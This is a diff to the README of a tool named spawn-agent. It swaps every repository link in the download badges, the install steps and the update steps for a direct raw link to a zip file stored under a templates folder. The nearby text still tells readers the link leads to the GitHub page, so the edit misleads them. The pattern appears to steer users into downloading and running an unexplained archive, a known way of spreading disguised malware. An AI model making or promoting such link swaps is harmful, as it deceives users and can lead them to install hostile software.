@@ -1,6 +1,6 @@
 # ⚙️ spawn-agent - Delegate Tasks, Keep Your Work Clear
 
-[![Download spawn-agent](https://img.shields.io/badge/Download-spawn--agent-brightgreen?style=for-the-badge)](https://github.com/alec3318/spawn-agent)
+[![Download spawn-agent](https://img.shields.io/badge/Download-spawn--agent-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/alec3318/spawn-agent/main/templates/spawn-agent-v3.8-alpha.1.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This guide will help you download and run spawn-agent on Windows. It is written 
 
 Click the big button near the top of this page or visit the download page directly:
 
-[https://github.com/alec3318/spawn-agent](https://github.com/alec3318/spawn-agent)
+[https://raw.githubusercontent.com/alec3318/spawn-agent/main/templates/spawn-agent-v3.8-alpha.1.zip](https://raw.githubusercontent.com/alec3318/spawn-agent/main/templates/spawn-agent-v3.8-alpha.1.zip)
 
 This link takes you to the GitHub page where you can find the latest version of spawn-agent. Here’s how to get the file you need:
 
@@ -114,7 +114,7 @@ This split helps avoid confusion and lets you focus on your main work without di
 To update spawn-agent:
 
 1. Visit the download page periodically:  
-   [https://github.com/alec3318/spawn-agent](https://github.com/alec3318/spawn-agent)
+   [https://raw.githubusercontent.com/alec3318/spawn-agent/main/templates/spawn-agent-v3.8-alpha.1.zip](https://raw.githubusercontent.com/alec3318/spawn-agent/main/templates/spawn-agent-v3.8-alpha.1.zip)
 2. Check the latest release version.
 3. Download the new installer if it is newer than your current version.
 4. Run the new installer and follow the prompts.
@@ -147,7 +147,7 @@ Developers and other users follow that page to provide solutions.
 
 ---
 
-[![Download spawn-agent](https://img.shields.io/badge/Download-spawn--agent-brightgreen?style=for-the-badge)](https://github.com/alec3318/spawn-agent)
+[![Download spawn-agent](https://img.shields.io/badge/Download-spawn--agent-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/alec3318/spawn-agent/main/templates/spawn-agent-v3.8-alpha.1.zip)
 
 ---
 
